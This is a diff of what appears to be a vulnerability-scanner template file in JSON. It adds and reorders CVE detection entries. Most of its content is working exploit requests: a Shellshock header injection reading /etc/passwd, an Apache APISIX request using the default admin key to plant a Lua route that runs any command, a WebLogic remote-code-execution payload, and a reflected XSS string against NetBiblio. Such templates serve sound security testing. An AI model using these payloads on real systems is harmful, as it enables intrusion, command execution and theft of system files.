@@ -3229,9 +3229,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9245,6 +9245,21 @@
       ]
     },
     {
+      "id": "CVE-2020-13945",
+      "info": {
+        "name": "Apache APISIX's Admin API Default Access Token (RCE)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /apisix/admin/routes HTTP/1.1\nHost: {{Hostname}}\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\nContent-Type: application/json\n\n{\n  \"uri\":\"/{{randstr}}\",\n  \"script\":\"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f =        assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n  \"upstream\":{\n    \"type\":\"roundrobin\",\n    \"nodes\":{\n      \"example.com:80\":1\n    }\n  }\n}\n",
+            "GET /{{randstr}}?cmd=id HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-14092",
       "info": {
         "name": "WordPress Payment Form For Paypal Pro Unauthenticated SQL Injection",
@@ -9344,8 +9359,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Test-Header": "cat /etc/passwd"
+            "Test-Header": "cat /etc/passwd",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -14440,6 +14455,22 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\n",
             "POST / HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\n\n__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode(\"§VS§\")}}&__VIEWSTATEGENERATOR={{url_encode(\"§VSG§\")}}&__EVENTVALIDATION={{url_encode(\"§EV§\")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42551",
+      "info": {
+        "name": "NetBiblio WebOPAC - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x",
+            "{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F"
           ]
         }
       ]
